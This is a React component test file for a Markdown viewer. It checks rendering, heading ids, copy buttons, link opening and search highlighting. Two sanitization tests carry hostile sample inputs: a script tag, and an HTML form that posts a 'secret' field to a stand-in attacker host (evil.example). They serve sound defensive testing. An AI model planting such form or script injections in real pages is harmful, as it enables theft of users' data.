import { act, fireEvent, render, screen } from "@testing-library/react";
import { openUrl } from "@tauri-apps/plugin-opener";
import { MarkdownDocument } from "./MarkdownDocument";
import { extractOutline } from "../lib/outline";
import { useState } from "react";
import { beforeEach, describe, expect, it, vi } from "vitest";

vi.mock("@tauri-apps/plugin-opener", () => ({
  openUrl: vi.fn(),
}));

beforeEach(() => {
  vi.mocked(openUrl).mockClear();
});

describe("MarkdownDocument", () => {
  it("renders headings, lists, tables, quotes, and code", async () => {
    const markdown = [
      "# Title",
      "",
      "> Quote",
      "",
      "- item",
      "",
      "| A | B |",
      "| - | - |",
      "| 1 | 2 |",
      "",
      "```ts",
      "const value = 1;",
      "```",
    ].join("\n");

    render(<MarkdownDocument markdown={markdown} />);
    // 让按需加载的高亮语言包在 act 内完成，避免 act(...) 警告
    await act(async () => {});

    expect(screen.getByRole("heading", { name: "Title" })).toBeInTheDocument();
    expect(screen.getByText("Quote")).toBeInTheDocument();
    expect(screen.getByText("item")).toBeInTheDocument();
    expect(screen.getByRole("table")).toBeInTheDocument();
    const codeBlock = screen.getByRole("code");
    expect(codeBlock).toHaveTextContent("const value = 1;");
  });

  it("does not render script tags from Markdown", () => {
    const markdown = ["Safe", "", '<script>alert("x")</script>'].join("\n");
    render(<MarkdownDocument markdown={markdown} />);

    expect(screen.queryByText('alert("x")')).not.toBeInTheDocument();
    expect(screen.getByText("Safe")).toBeInTheDocument();
  });

  it("preserves safe raw HTML such as divs and tables", () => {
    const markdown = [
      '<div align="center">Centered</div>',
      "",
      "<table><tr><td>cell</td></tr></table>",
    ].join("\n");

    render(<MarkdownDocument markdown={markdown} />);

    expect(screen.getByText("Centered")).toBeInTheDocument();
    expect(screen.getByText("cell")).toBeInTheDocument();
  });

  it("renders heading ids from the outline", () => {
    render(
      <MarkdownDocument
        markdown={["# Title", "", "## Section"].join("\n")}
        headings={[
          { id: "title", level: 1, text: "Title" },
          { id: "section", level: 2, text: "Section" },
        ]}
      />
    );

    expect(screen.getByRole("heading", { name: "Title" })).toHaveAttribute("id", "title");
    expect(screen.getByRole("heading", { name: "Section" })).toHaveAttribute("id", "section");
  });

  it("handles duplicate heading text with unique ids from the outline", () => {
    render(
      <MarkdownDocument
        markdown={["# Title", "", "# Title", "", "# Title"].join("\n")}
        headings={[
          { id: "title", level: 1, text: "Title" },
          { id: "title-1", level: 1, text: "Title" },
          { id: "title-2", level: 1, text: "Title" },
        ]}
      />
    );

    const headings = screen.getAllByRole("heading", { name: "Title" });
    expect(headings).toHaveLength(3);
    expect(headings[0]).toHaveAttribute("id", "title");
    expect(headings[1]).toHaveAttribute("id", "title-1");
    expect(headings[2]).toHaveAttribute("id", "title-2");
  });

  it("resets heading id allocation when document or headings change", () => {
    const { rerender } = render(
      <MarkdownDocument
        markdown="# Title"
        headings={[{ id: "first-title", level: 1, text: "Title" }]}
      />
    );

    expect(screen.getByRole("heading", { name: "Title" })).toHaveAttribute("id", "first-title");

    rerender(
      <MarkdownDocument
        markdown="# Title"
        headings={[{ id: "second-title", level: 1, text: "Title" }]}
      />
    );

    expect(screen.getByRole("heading", { name: "Title" })).toHaveAttribute("id", "second-title");
  });

  it("keeps stable heading ids stable across re-renders with the same headings", () => {
    const { rerender } = render(
      <MarkdownDocument
        markdown="# Title"
        headings={[{ id: "keep", level: 1, text: "Title" }]}
      />
    );

    expect(screen.getByRole("heading", { name: "Title" })).toHaveAttribute("id", "keep");

    rerender(
      <MarkdownDocument
        markdown="# Title"
        headings={[{ id: "keep", level: 1, text: "Title" }]}
      />
    );

    expect(screen.getByRole("heading", { name: "Title" })).toHaveAttribute("id", "keep");
  });

  it("generates unique fallback ids when no headings prop is provided", () => {
    render(<MarkdownDocument markdown={["# Same", "", "# Same"].join("\n")} />);

    const headings = screen.getAllByRole("heading", { name: "Same" });
    expect(headings).toHaveLength(2);
    expect(headings[0]).toHaveAttribute("id", "same");
    expect(headings[1]).toHaveAttribute("id", "same-1");
  });

  it("generates unique fallback ids for duplicate rich-text headings", () => {
    render(<MarkdownDocument markdown={["# **Same**", "", "# **Same**"].join("\n")} />);

    const headings = screen.getAllByRole("heading", { name: "Same" });
    expect(headings).toHaveLength(2);
    expect(headings[0]).toHaveAttribute("id", "same");
    expect(headings[1]).toHaveAttribute("id", "same-1");
  });

  it("matches heading ids generated by extractOutline", () => {
    const markdown = ["# A \u0026eacute; B", "", "## **Same**"].join("\n");
    const headings = extractOutline(markdown);
    render(<MarkdownDocument markdown={markdown} headings={headings} />);

    expect(screen.getByRole("heading", { name: "A é B" })).toHaveAttribute("id", headings[0].id);
    expect(screen.getByRole("heading", { name: "Same" })).toHaveAttribute("id", headings[1].id);
  });

  it("renders inline code without a copy button", () => {
    render(<MarkdownDocument markdown="Use `inlineCode` here." />);
    expect(screen.getByRole("code")).toHaveTextContent("inlineCode");
    expect(screen.queryByRole("button", { name: "复制" })).not.toBeInTheDocument();
  });

  it("renders a copyable code block for fenced code with language", async () => {
    vi.stubGlobal("navigator", { clipboard: { writeText: vi.fn().mockResolvedValueOnce(undefined) } });
    render(<MarkdownDocument markdown="```ts
const x = 1;
```" />);
    expect(screen.getByText("ts")).toBeInTheDocument();
    await act(async () => {
      fireEvent.click(screen.getByRole("button", { name: "复制" }));
    });
    expect(navigator.clipboard.writeText).toHaveBeenCalledWith("const x = 1;");
    vi.unstubAllGlobals();
  });

  it("renders a copyable code block for fenced code without language", async () => {
    vi.stubGlobal("navigator", { clipboard: { writeText: vi.fn().mockResolvedValueOnce(undefined) } });
    render(<MarkdownDocument markdown="```
plain block
```" />);
    expect(screen.getByRole("button", { name: "复制" })).toBeInTheDocument();
    expect(screen.queryByText("plain")).not.toBeInTheDocument();
    await act(async () => {
      fireEvent.click(screen.getByRole("button", { name: "复制" }));
    });
    expect(navigator.clipboard.writeText).toHaveBeenCalledWith("plain block");
    vi.unstubAllGlobals();
  });

  it("renders copy controls for sanitized raw HTML pre > code", async () => {
    vi.stubGlobal("navigator", { clipboard: { writeText: vi.fn().mockResolvedValueOnce(undefined) } });
    render(<MarkdownDocument markdown="<pre><code>raw html</code></pre>" />);
    expect(screen.getByRole("button", { name: "复制" })).toBeInTheDocument();
    await act(async () => {
      fireEvent.click(screen.getByRole("button", { name: "复制" }));
    });
    expect(navigator.clipboard.writeText).toHaveBeenCalledWith("raw html");
    vi.unstubAllGlobals();
  });

  it("preserves nested safe raw HTML inside pre > code for display and clipboard", async () => {
    vi.stubGlobal("navigator", { clipboard: { writeText: vi.fn().mockResolvedValueOnce(undefined) } });
    render(<MarkdownDocument markdown="<pre><code>raw <span>html</span></code></pre>" />);

    expect(screen.getByRole("code")).toHaveTextContent("raw html");
    await act(async () => {
      fireEvent.click(screen.getByRole("button", { name: "复制" }));
    });
    expect(navigator.clipboard.writeText).toHaveBeenCalledWith("raw html");
    vi.unstubAllGlobals();
  });

  it("strips form elements from raw HTML", () => {
    const markdown = [
      '<form action="https://evil.example/collect" method="post">',
      '<button type="submit">提交</button>',
      '<textarea name="secret">secret</textarea>',
      '<select name="choice"><option value="1">one</option></select>',
      '<label for="x">标签</label>',
      "</form>",
    ].join("\n");

    const { container } = render(<MarkdownDocument markdown={markdown} />);

    expect(container.querySelector("form")).not.toBeInTheDocument();
    expect(container.querySelector("button")).not.toBeInTheDocument();
    expect(container.querySelector("textarea")).not.toBeInTheDocument();
    expect(container.querySelector("select")).not.toBeInTheDocument();
    expect(container.querySelector("option")).not.toBeInTheDocument();
    expect(container.querySelector("label")).not.toBeInTheDocument();
    expect(container.querySelector("[action]")).not.toBeInTheDocument();
  });

  it("keeps GFM task list checkboxes", () => {
    const { container } = render(<MarkdownDocument markdown={["- [ ] 待办", "- [x] 完成"].join("\n")} />);

    expect(container.querySelectorAll('input[type="checkbox"]')).toHaveLength(2);
  });

  it("opens mailto links with the system opener instead of the webview", () => {
    render(<MarkdownDocument markdown="[写信](mailto:a@example.com)" />);

    fireEvent.click(screen.getByRole("link", { name: "写信" }));

    expect(openUrl).toHaveBeenCalledWith("mailto:a@example.com");
  });

  it("opens ftp links with the system opener instead of the webview", () => {
    render(<MarkdownDocument markdown="[文件](ftp://example.com/a.zip)" />);

    fireEvent.click(screen.getByRole("link", { name: "文件" }));

    expect(openUrl).toHaveBeenCalledWith("ftp://example.com/a.zip");
  });

  it("keeps in-page anchors as plain links", () => {
    render(<MarkdownDocument markdown="[跳转](#section)" />);

    const link = screen.getByRole("link", { name: "跳转" });
    fireEvent.click(link);

    expect(openUrl).not.toHaveBeenCalled();
    expect(link).toHaveAttribute("href", "#section");
  });

  it("passes the image title through to the img element", () => {
    render(<MarkdownDocument markdown={'![alt](https://example.com/a.png "示意图")'} />);

    expect(screen.getByRole("img", { name: "alt" })).toHaveAttribute("title", "示意图");
  });

  it("does not leak the node prop onto inline code elements", () => {
    const { container } = render(<MarkdownDocument markdown="Use `inlineCode` here." />);

    expect(container.querySelector("code")).not.toHaveAttribute("node");
  });

  it("highlights searches declaratively across query changes and resets", () => {
    const onMatchCountChange = vi.fn();
    // mock 出「匹配项在视口下方 500px」的位置差，让搜索跳转真正启动 rAF 缓动动画
    vi.spyOn(HTMLElement.prototype, "getBoundingClientRect").mockImplementation(function (this: HTMLElement) {
      const top = this.classList.contains("document-scroll") ? 0 : 500;
      return { top, bottom: top + 20, height: 20 } as DOMRect;
    });
    const raf = vi.spyOn(window, "requestAnimationFrame");

    const { container, rerender } = render(
      <div className="document-scroll">
        <MarkdownDocument
          markdown="Alpha alpha beta"
          searchQuery="ALPHA"
          activeMatchIndex={1}
          onMatchCountChange={onMatchCountChange}
        />
      </div>
    );

    let marks = container.querySelectorAll("mark.search-match");
    expect(marks).toHaveLength(2);
    expect(marks[0]).toHaveTextContent("Alpha");
    expect(marks[1]).toHaveClass("search-match--current");
    expect(onMatchCountChange).toHaveBeenLastCalledWith(2);
    // 搜索跳转应启动 rAF 缓动动画（而非原生 scrollIntoView）
    expect(raf).toHaveBeenCalled();

    rerender(
      <div className="document-scroll">
        <MarkdownDocument
          markdown="Alpha alpha beta"
          searchQuery="beta"
          activeMatchIndex={0}
          onMatchCountChange={onMatchCountChange}
        />
      </div>
    );
    marks = container.querySelectorAll("mark.search-match");
    expect(marks).toHaveLength(1);
    expect(marks[0]).toHaveTextContent("beta");
    expect(marks[0]).toHaveClass("search-match--current");

    rerender(
      <MarkdownDocument
        markdown="Alpha alpha beta"
        searchQuery=""
        activeMatchIndex={0}
        onMatchCountChange={onMatchCountChange}
      />
    );
    expect(container.querySelectorAll("mark.search-match")).toHaveLength(0);
    expect(onMatchCountChange).toHaveBeenLastCalledWith(0);

    rerender(
      <MarkdownDocument
        markdown="Alpha alpha beta"
        searchQuery="alpha"
        activeMatchIndex={0}
        onMatchCountChange={onMatchCountChange}
      />
    );
    expect(container.querySelectorAll("mark.search-match")).toHaveLength(2);
  });

  it("supports markdown updates, parent count state updates, and unmount while searching", () => {
    function SearchHarness() {
      const [count, setCount] = useState(-1);
      const [markdown, setMarkdown] = useState("one");
      return (
        <>
          <span data-testid="match-count">{count}</span>
          <button type="button" onClick={() => setMarkdown("one one")}>update</button>
          <MarkdownDocument
            markdown={markdown}
            searchQuery="one"
            activeMatchIndex={0}
            onMatchCountChange={setCount}
          />
        </>
      );
    }

    const { container, unmount } = render(<SearchHarness />);
    expect(screen.getByTestId("match-count")).toHaveTextContent("1");
    expect(container.querySelectorAll("mark.search-match")).toHaveLength(1);

    fireEvent.click(screen.getByRole("button", { name: "update" }));
    expect(screen.getByTestId("match-count")).toHaveTextContent("2");
    expect(container.querySelectorAll("mark.search-match")).toHaveLength(2);
    expect(() => unmount()).not.toThrow();
  });

  it("skips inline and fenced code subtrees when highlighting", () => {
    const { container } = render(
      <MarkdownDocument
        markdown={["term", "", "`term`", "", "```txt", "term", "```"].join("\n")}
        searchQuery="term"
        activeMatchIndex={0}
      />
    );

    expect(container.querySelectorAll("mark.search-match")).toHaveLength(1);
    expect(container.querySelector("code mark")).not.toBeInTheDocument();
  });
});
